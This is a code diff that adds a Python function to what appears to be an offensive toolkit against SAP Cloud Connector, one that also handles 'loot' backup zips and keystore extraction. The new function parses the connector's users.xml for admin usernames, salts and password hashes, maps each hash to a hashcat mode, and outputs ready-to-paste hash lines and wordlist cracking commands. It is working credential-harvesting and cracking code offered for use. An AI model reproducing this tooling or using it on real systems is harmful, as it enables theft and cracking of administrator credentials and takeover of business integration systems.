@@ -395,6 +395,158 @@ def parse_ha_state_from_zip(loot_zip_path: str) -> dict:
     }
 
 
+def parse_user_hashes_from_xml(xml_bytes: bytes) -> dict:
+    """Parse SCC users.xml content (on-disk plaintext, not backup-zip).
+
+    SCC stores local admin-UI user credentials in
+    ``/opt/sap/scc/config/users.xml``.  The password hash field and
+    algorithm vary by build:
+
+    Older builds (< ~2.15) — SHA-1 with hex or base64 salt+hash:
+        <Password algorithm="SHA-1" salt="<b64salt>" value="<b64hash>" />
+
+    Newer builds (≥ 2.15) — PBKDF2-HMAC-SHA256 or plain SHA-256:
+        <Password algorithm="SHA-256" iterations="<n>"
+                  salt="<b64salt>" value="<b64hash>" />
+
+    Both flavours: hash = ALGO(salt_bytes || password_bytes).
+    Hashcat modes:
+        SHA-1 plain  → -m 110  sha1($pass.$salt) — try also -m 111
+        SHA-256 plain → -m 1410 sha256($pass.$salt) — try -m 1411
+        PBKDF2-SHA256 → -m 10900
+
+    Returns::
+
+        {
+          "ok": True,
+          "users": [
+            {
+              "username": str,
+              "algorithm": "SHA-1" | "SHA-256" | "PBKDF2" | "",
+              "iterations": int,          # 1 for plain hash
+              "salt_b64": str,
+              "hash_b64": str,
+              "salt_hex": str,
+              "hash_hex": str,
+              "hashcat_line": str,        # ready-to-paste hash:salt
+              "hashcat_mode": int,        # best-guess mode
+              "locked": bool,
+              "roles": str,
+            }, ...
+          ],
+          "hashcat_commands": [str, ...],
+        }
+    """
+    import base64 as _b64
+    import binascii as _bx
+
+    def _b64_to_hex(s):
+        try:
+            return _bx.hexlify(_b64.b64decode(s)).decode()
+        except Exception:
+            return s
+
+    try:
+        root = _ET.fromstring(xml_bytes)
+    except _ET.ParseError as e:
+        return {"ok": False, "error": f"XML parse error: {e}"}
+
+    users = []
+    for u in root.iter("User"):
+        uname = u.get("name") or u.get("userName") or ""
+        locked = (u.get("locked") or "").lower() == "true"
+        roles = u.get("roles") or u.get("role") or ""
+        pw = u.find("Password")
+        if pw is None:
+            pw = u.find("password")
+        if pw is None:
+            users.append({"username": uname, "locked": locked,
+                          "roles": roles, "algorithm": "",
+                          "hash_b64": "", "salt_b64": "",
+                          "hash_hex": "", "salt_hex": "",
+                          "hashcat_line": "", "hashcat_mode": 0,
+                          "iterations": 1})
+            continue
+        algo_raw = (pw.get("algorithm") or pw.get("algo") or "").upper()
+        algo_raw = algo_raw.replace("-", "").replace("_", "")
+        iters = int(pw.get("iterations") or pw.get("count") or 1)
+        salt_b64 = (pw.get("salt") or pw.get("saltValue") or "").strip()
+        hash_b64 = (pw.get("value") or pw.get("hashValue") or "").strip()
+        # Some builds store hex directly
+        if not salt_b64:
+            salt_b64 = (pw.get("saltHex") or "")
+            if salt_b64:
+                salt_b64 = _b64.b64encode(
+                    bytes.fromhex(salt_b64)).decode()
+        if not hash_b64:
+            hash_b64 = (pw.get("hashHex") or "")
+            if hash_b64:
+                hash_b64 = _b64.b64encode(
+                    bytes.fromhex(hash_b64)).decode()
+        salt_hex = _b64_to_hex(salt_b64)
+        hash_hex = _b64_to_hex(hash_b64)
+        # Map algorithm to hashcat mode
+        if "SHA256" in algo_raw or "SHA2" in algo_raw:
+            if iters > 1:
+                algo = "PBKDF2-SHA256"
+                mode = 10900
+                # hashcat PBKDF2-SHA256 format: sha256:iters:b64salt:b64hash
+                hline = f"sha256:{iters}:{salt_b64}:{hash_b64}"
+            else:
+                algo = "SHA-256"
+                mode = 1410
+                hline = f"{hash_hex}:{salt_hex}"
+        elif "SHA1" in algo_raw or "SHA" in algo_raw:
+            algo = "SHA-1"
+            mode = 110
+            hline = f"{hash_hex}:{salt_hex}"
+        else:
+            algo = algo_raw or "unknown"
+            mode = 0
+            hline = f"{hash_hex}:{salt_hex}"
+        users.append({
+            "username": uname,
+            "algorithm": algo,
+            "iterations": iters,
+            "salt_b64": salt_b64,
+            "hash_b64": hash_b64,
+            "salt_hex": salt_hex,
+            "hash_hex": hash_hex,
+            "hashcat_line": hline,
+            "hashcat_mode": mode,
+            "locked": locked,
+            "roles": roles,
+        })
+
+    # Build per-algorithm hashcat commands
+    cmds = []
+    modes_seen = {}
+    for u in users:
+        m = u["hashcat_mode"]
+        if m and m not in modes_seen:
+            modes_seen[m] = u["algorithm"]
+    if 110 in modes_seen:
+        cmds.append(
+            "hashcat -m 110 scc_sha1_hashes.txt /path/to/wordlist.txt\n"
+            "# SHA-1(pass+salt) — format: hash:salt (hex)\n"
+            "# If no hits: try -m 111  (SHA-1 with salt prepended)")
+    if 1410 in modes_seen:
+        cmds.append(
+            "hashcat -m 1410 scc_sha256_hashes.txt /path/to/wordlist.txt\n"
+            "# SHA-256(pass+salt) — format: hash:salt (hex)\n"
+            "# If no hits: try -m 1411 (SHA-256 with salt prepended)")
+    if 10900 in modes_seen:
+        cmds.append(
+            "hashcat -m 10900 scc_pbkdf2_hashes.txt /path/to/wordlist.txt\n"
+            "# PBKDF2-HMAC-SHA256 — format: sha256:iters:b64salt:b64hash")
+    if not cmds and users:
+        cmds.append(
+            "# Algorithm unknown — check hash length and try:\n"
+            "# hashcat -m 110 (SHA-1) or -m 1410 (SHA-256)")
+
+    return {"ok": True, "users": users, "hashcat_commands": cmds}
+
+
 def extract_keystore(host: str, user: str, password: str, *,
                      backup_password: Optional[str] = None,
                      port: int = 8443, timeout: float = 30.0,
